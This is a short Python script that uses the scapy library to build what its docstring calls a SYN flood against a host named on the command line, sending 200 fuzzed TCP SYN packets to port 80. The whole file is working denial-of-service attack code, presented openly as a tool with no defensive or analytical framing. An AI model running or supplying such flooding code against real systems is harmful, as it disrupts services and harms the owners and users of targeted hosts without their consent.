#!/usr/bin/env python
# The first two lines are for not having warnning message
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import argparse
from scapy.all import *

def main():
    '''
        Build a SYN flood against a host using scapy
    '''
    parser = argparse.ArgumentParser()
    parser.add_argument("host", help="The destination host 198.51.100.1")
    args = parser.parse_args()

    # SYN structure
    #synpkt = sr1(IP(dst = args.host) / TCP(dport=80, flags="S"))
    #synpkt.show()

    for i in range (0, 200):
        message = ( (IP(dst=args.host)) / fuzz(TCP(dport=80,flags='S')) )
        send(message)

if __name__ == "__main__":
    main()

